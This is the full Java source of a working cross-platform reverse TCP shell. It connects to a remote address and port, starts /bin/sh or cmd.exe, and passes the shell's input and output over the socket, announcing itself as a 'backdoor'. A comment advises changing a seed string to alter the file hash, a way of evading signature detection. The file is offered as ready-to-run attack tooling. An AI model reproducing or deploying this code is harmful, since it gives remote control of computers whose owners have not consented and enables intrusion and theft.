// Copyright (c) 2021 Ivan Šincek
// Requires Java SE v8 or greater and JDK v8 or greater.
// Works on Linux OS, macOS, and Windows OS.
package reverse.shell;

import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;

public class ReverseShell {

    // change seed to help you change the file hash
    private String  seed   = "3301Kira";
    private String  addr   = null;
    private int     port   = -1;
    private String  os     = null;
    private String  shell  = null;
    private byte[]  buffer = null;
    private int     clen   = 0;
    private boolean error  = false;

    public ReverseShell(String addr, int port) {
        this.addr = addr;
        this.port = port;
    }

    private boolean detect() {
        boolean detected = true;
        this.os = System.getProperty("os.name").toUpperCase();
        if (this.os.contains("LINUX") || this.os.contains("MAC")) {
            this.os    = "LINUX";
            this.shell = "/bin/sh";
        } else if (this.os.contains("WIN")) {
            this.os    = "WINDOWS";
            this.shell = "cmd.exe";
        } else {
            detected = false;
            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
        }
        return detected;
    }

    // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
    private void brw(InputStream input, OutputStream output, String iname, String oname) {
        int bytes;
        try {
            do {
                if (this.os.equals("WINDOWS") && iname.equals("STDOUT") && this.clen > 0) {
                    // for some reason Windows OS pipes STDIN into STDOUT
                    // we do not like that
                    // we need to discard the data from the stream
                    do {
                        bytes = input.read(this.buffer, 0, this.clen >= this.buffer.length ? this.buffer.length : this.clen);
                        this.clen -= this.clen >= this.buffer.length ? this.buffer.length : this.clen;
                    } while (bytes > 0 && this.clen > 0);
                } else {
                    bytes = input.read(this.buffer, 0, this.buffer.length);
                    if (bytes > 0) {
                        output.write(this.buffer, 0, bytes);
                        output.flush();
                        if (this.os.equals("WINDOWS") && oname.equals("STDIN")) {
                            this.clen += bytes;
                        }
                    } else if (iname.equals("SOCKET")) {
                        this.error = true;
                        System.out.print("SOC_ERROR: Shell connection has been terminated\n");
                    }
                }
            } while (input.available() > 0);
        } catch (SocketTimeoutException ex) {} catch (IOException ex) {
            this.error = true;
            System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n", iname, oname));
        }
    }

    public void run() {
        if (this.detect()) {
            Process process = null;
            this.buffer = new byte[1024];
            try (
                    Socket client = new Socket();
                ) {
                client.setSoTimeout(100);
                client.connect(new InetSocketAddress(this.addr, this.port));
                process = new ProcessBuilder(this.shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                try (
                        OutputStream socin  = client.getOutputStream();
                        InputStream  socout = client.getInputStream();
                        OutputStream stdin  = process.getOutputStream();
                        InputStream  stdout = process.getInputStream();
                        InputStream  stderr = process.getErrorStream();
                    ) {
                    System.out.print("Backdoor is up and running...\n");
                    do {
                        if (!process.isAlive()) {
                            System.out.print("PROC_ERROR: Shell process has been terminated\n");
                            break;
                        }
                        this.brw(socout, stdin, "SOCKET", "STDIN");
                        if (stderr.available() > 0) { this.brw(stderr, socin, "STDERR", "SOCKET"); }
                        if (stdout.available() > 0) { this.brw(stdout, socin, "STDOUT", "SOCKET"); }
                    } while (!this.error);
                    System.out.print("Backdoor will now exit...\n");
                }
            } catch (IOException ex) {
                System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
            } finally {
                if (process != null) { process.destroy(); }
                Arrays.fill(this.buffer, (byte) 0);
            }
        }
    }

    public static void main(String[] args) {
        System.out.print("Java Reverse TCP v4.0 by Ivan Sincek.\n");
        System.out.print("GitHub repository at github.com/ivan-sincek/java-reverse-tcp.\n");
        if (args.length != 2) {
            System.out.print("Usage: java -jar Reverse_Shell.jar <addr> <port>\n");
            return;
        }
        if ((args[0] = args[0].trim()).length() < 1) {
            System.out.print("Address is required\n");
            return;
        }
        int port;
        if ((args[1] = args[1].trim()).length() < 1) {
            System.out.print("Port number is required\n");
            return;
        }
        try {
            port = Integer.parseInt(args[1]);
            if (port < 0 || port > 65535) {
                System.out.print("Port number is out of range\n");
                return;
            }
        } catch (NumberFormatException ex) {
            System.out.print("Port number is not valid\n");
            return;
        }
        ReverseShell sh = new ReverseShell(args[0], port);
        sh.run();
        sh = null;
        System.gc();
    }

}
